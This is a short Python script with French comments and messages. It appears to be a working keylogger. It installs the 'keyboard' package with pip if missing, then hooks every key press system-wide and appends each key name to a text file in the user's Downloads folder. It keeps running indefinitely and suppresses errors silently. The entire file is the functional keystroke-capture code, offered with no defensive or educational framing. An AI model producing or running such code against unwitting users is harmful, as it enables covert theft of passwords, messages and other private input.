import os
import importlib
import subprocess
import sys

try:
    importlib.import_module("keyboard")
except ImportError:
    print("La bibliothèque keyboard n'est pas installée. Installation en cours...")
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'keyboard'])
    except Exception as e:
        print(f"Erreur lors de l'installation de keyboard : {e}")
        sys.exit(1)

import keyboard

dossier_telechargements = os.path.join(os.path.expanduser('~'), 'Downloads')
chemin_fichier = os.path.join(dossier_telechargements, 'enregistrement_clavier.txt')

def enregistrer_frappes(e):
    try:
        with open(chemin_fichier, "a") as fichier:
            fichier.write(e.name)
    except:
        pass

keyboard.on_press(enregistrer_frappes)

keyboard.wait()
